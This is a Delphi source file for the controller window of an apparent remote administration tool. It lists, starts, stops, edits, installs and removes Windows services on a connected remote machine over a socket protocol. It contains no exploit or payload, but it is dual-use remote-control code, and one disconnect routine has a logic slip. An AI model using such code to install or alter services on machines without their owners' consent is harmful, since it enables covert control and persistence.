unit UnitServiceManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb, Buttons;

type
  TServiceManager = class(TForm)
    StatusBar1: TStatusBar;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Refresh1: TMenuItem;
    N1: TMenuItem;
    Edit1: TMenuItem;
    Start1: TMenuItem;
    Stop1: TMenuItem;
    Install1: TMenuItem;
    Remove1: TMenuItem;
    ListView1: TListView;
    Timer1: TTimer;
    procedure Refresh1Click(Sender: TObject);
    procedure Start1Click(Sender: TObject);
    procedure Stop1Click(Sender: TObject);
    procedure Remove1Click(Sender: TObject);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure Edit1Click(Sender: TObject);
    procedure Install1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  ServiceManager: TServiceManager;

implementation

uses UnitEditService, UnitCreateService;

{$R *.dfm}


procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'ServiceManager|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  TServiceManager(SocketData.Form).NewSocket := nil;
  TServiceManager(SocketData.Form).Caption := TServiceManager(SocketData.Form).Caption + ' - [Offline]';
  if TServiceManager(SocketData.Form).NewSocket = nil then exit;
  TServiceManager(SocketData.Form).Timer1.Enabled := True;
end;

procedure TServiceManager.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
  Strings: TStringList;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  Refresh1.Click;
end;


procedure TServiceManager.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  Tmp: string;
  i: integer;
  Strings: TStringList;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'List' then begin
    Listview1.Clear;

    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      if Split(Strings.Strings[i], '|', 1) = '' then Continue;
      Li := Listview1.Items.Add;
      Li.Caption := Split(Strings.Strings[i], '|', 1);
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 2));

      if Split(Strings.Strings[i], '|', 3) = '4' then Li.SubItems.Add('Started')
      else Li.SubItems.Add('Stopped');

      if Split(Strings.Strings[i], '|', 4) = '2' then Li.SubItems.Add('Automatic');
      if Split(Strings.Strings[i], '|', 4) = '3' then Li.SubItems.Add('Manual');
      if Split(Strings.Strings[i], '|', 4) = '4' then Li.SubItems.Add('Disabled');

      Li.SubItems.Add(Split(Strings.Strings[i], '|', 5));
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 6));
    end;
    Strings.Free;
    Listview1.Enabled := True;
    ListView1.Items[0].Selected := True;
  end;

end;


procedure TServiceManager.Refresh1Click(Sender: TObject);
begin
  Listview1.Enabled := False;
  SendData(NewSocket,'List');
end;

procedure TServiceManager.Start1Click(Sender: TObject);
var
  Number: integer;
begin
  for Number := 0 to ListView1.Items.Count -1 do begin
    Application.ProcessMessages;
    if not listview1.Items[Number].Selected then Continue;
    SendData(NewSocket,'Start|' + listview1.Items[Number].SubItems[0]);
  end;
  Refresh1.Click;

end;

procedure TServiceManager.Stop1Click(Sender: TObject);
var
  Number: integer;
begin
  for Number := 0 to ListView1.Items.Count -1 do begin
    Application.ProcessMessages;
    if not listview1.Items[Number].Selected then Continue;
    SendData(NewSocket,'Stop|' + listview1.Items[Number].SubItems[0]);
  end;
  Refresh1.Click;

end;

procedure TServiceManager.Remove1Click(Sender: TObject);
var
  Number: integer;
begin
  for Number := 0 to ListView1.Items.Count -1 do begin
    Application.ProcessMessages;
    if not listview1.Items[Number].Selected then Continue;
    SendData(NewSocket,'Remove|' + listview1.Items[Number].SubItems[0]);
  end;
  Refresh1.Click;
end;

procedure TServiceManager.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := $F7F7F7;
end;

procedure TServiceManager.ListView1CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := clWhite;
  if (SubItem = 2) and (pos('Stopped',Item.SubItems[1])>0) then ListView1.Canvas.Font.Color := clRed
  else ListView1.Canvas.Font.Color := clBlack;
end;

procedure TServiceManager.Edit1Click(Sender: TObject);
var
  DisplayName: string;
  ServiceName: string;
  FileName: string;
  Desc: string;
  Startup: string;
  STartNow: string;
begin
  if not assigned(listview1.Selected) then exit;

  EditService.Edit1.Text := Listview1.Selected.Caption;
  EditService.Edit2.Text := Listview1.Selected.SubItems[0];
  EditService.Edit3.Text := Listview1.Selected.SubItems[3];
  EditService.Edit4.Text := Listview1.Selected.SubItems[4];

  if Listview1.Selected.SubItems[2] = 'Automatic' then EditService.ComboBox1.Text := '2: Automatic';
  if Listview1.Selected.SubItems[2] = 'Manual' then EditService.ComboBox1.Text := '3: Manual';
  if Listview1.Selected.SubItems[2] = 'Disabled' then EditService.ComboBox1.Text := '4: Disabled';

  if EditService.ShowModal <> mrok then exit;
  DisplayName := EditService.Edit1.Text;
  ServiceName := EditService.Edit2.Text;
  FileName := EditService.Edit3.Text;
  Desc := EditService.Edit4.Text;
  Startup := copy(EditService.Combobox1.Text,1,1);
  STartNow := '0';
  SendData(NewSocket,'Edit|' + ServiceName + '|' + DisplayName + '|' + FileName + '|' + Desc + '|' + Startup + '|' + STartNow);
  Refresh1.Click;
end;

procedure TServiceManager.Install1Click(Sender: TObject);
var
  DisplayName: string;
  ServiceName: string;
  FileName: string;
  Desc: string;
  Startup: string;
  STartNow: string;
begin
  if CreateService.ShowModal <> mrok then exit;
  DisplayName := CreateService.Edit1.Text;
  ServiceName := CreateService.Edit2.Text;
  FileName := CreateService.Edit3.Text;
  Desc := CreateService.Edit4.Text;
  Startup := copy(CreateService.Combobox1.Text,1,1);
  STartNow := '0';
  if CreateService.Checkbox1.Checked then StartNow := '1';
  SendData(NewSocket,'Install|' + ServiceName + '|' + DisplayName + '|' + FileName + '|' + Desc + '|' + Startup + '|' + STartNow);
  Refresh1.Click;
end;

procedure TServiceManager.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
  UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|ServiceManagerSocket|' + inttostr(Self.Handle));
end;

procedure TServiceManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

end.
